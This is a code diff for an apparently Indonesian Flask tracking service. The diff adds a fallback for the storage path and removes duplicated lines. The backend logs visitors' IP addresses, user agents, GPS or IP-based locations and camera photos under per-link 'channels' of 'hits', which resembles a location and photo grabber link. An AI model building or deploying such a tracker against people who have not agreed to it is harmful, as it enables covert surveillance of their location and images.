@@ -23,8 +23,36 @@ MAX_SIGNAL_PER_MB    = int(os.environ.get("MAX_SIGNAL_PER_MB", "200"))   # batas
 TTL_DAYS = int(os.environ.get("TTL_DAYS", "0"))  # 0=off
 REVERSE_GEOCODE = os.environ.get("REVERSE_GEOCODE", "true").lower() in ("1", "true", "yes")
 
+# --- Storage path preparation (robust) ---
+def _prepare_storage_paths():
+    """Ensure DATA_FILE parent & UPLOAD_DIR exist. If absolute path
+    (mis. /data) tidak bisa dibuat (no permission), fallback ke ./data/*."""
+    global UPLOAD_DIR, DATA_FILE
+    try:
+        # pastikan parent DATA_FILE ada
+        df_parent = os.path.dirname(DATA_FILE) or "."
+        if df_parent and not os.path.exists(df_parent):
+            os.makedirs(df_parent, exist_ok=True)
+
+        # pastikan UPLOAD_DIR ada
+        os.makedirs(UPLOAD_DIR, exist_ok=True)
+    except PermissionError:
+        # fallback ke ./data
+        print("[WARN] No permission to create", df_parent or UPLOAD_DIR, "- falling back to ./data")
+        base = os.path.join(os.getcwd(), "data")
+        os.makedirs(base, exist_ok=True)
+        # set ulang path global
+        UPLOAD_DIR = os.path.join(base, "uploads")
+        os.makedirs(UPLOAD_DIR, exist_ok=True)
+        if os.path.isabs(DATA_FILE):
+            DATA_FILE = os.path.join(base, "store.json")
+        # pastikan parent baru untuk DATA_FILE
+        df_parent = os.path.dirname(DATA_FILE) or "."
+        os.makedirs(df_parent, exist_ok=True)
+
+_prepare_storage_paths()
+
 app = Flask(__name__)
-os.makedirs(UPLOAD_DIR, exist_ok=True)
 
 # ===== STORAGE (tanpa DB) =====
 # channel = {
@@ -85,8 +113,6 @@ def require_admin(view):
 def get_client_ip(req):
     for h in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", "X-Client-IP", "Fastly-Client-IP"]:
         v = req.headers.get(h)
-        if v:
-            return v.split(",")[0].strip()
         if v:
             return v.split(",")[0].strip()
     return req.remote_addr
@@ -312,7 +338,6 @@ def api_track(token):
     lon = body.get("lon")
     acc = body.get("acc")
     src = "gps" if lat is not None and lon is not None else None
-    src = "gps" if lat is not None and lon is not None else None
 
     ip_meta = None
     if (lat is None or lon is None) and ip and not is_private_ip(ip):
@@ -322,7 +347,6 @@ def api_track(token):
             ip_meta = meta
             src = meta["source"]
 
-    hit_id = uuid4().hex[:8]
     hit_id = uuid4().hex[:8]
     item = {
         "id": hit_id,
@@ -378,19 +402,21 @@ def api_photo(token, hit_id):
         "kind": "photo",
         "ip": ip,
         "ua": ua,
-        "coords": {"lat": coords.get("lat"), "lon": coords.get("lon"), "acc": coords.get("acc"), "source": "camera"},
+        "coords": {
+            "lat": coords.get("lat"),
+            "lon": coords.get("lon"),
+            "acc": coords.get("acc"),
+            "source": "camera"
+        },
         "ip_label": ip_label,
         "photo_url": photo_url,
         "place": place,
         "parent_id": hit_id
     }
-    STORE["channels"][token]["hits"].append(item)
-    STORE["channels"][token]["hits"] = STORE["channels"][token]["hits"][-1000:]
 
     STORE["channels"][token]["hits"].append(photo_hit)
     trim_channel(token)
     save_store()
-    return jsonify({"ok": True, "id": hit_id})
     return jsonify({"ok": True, "photo_url": photo_url}), 200
 
 @app.route("/api/locations/<token>")
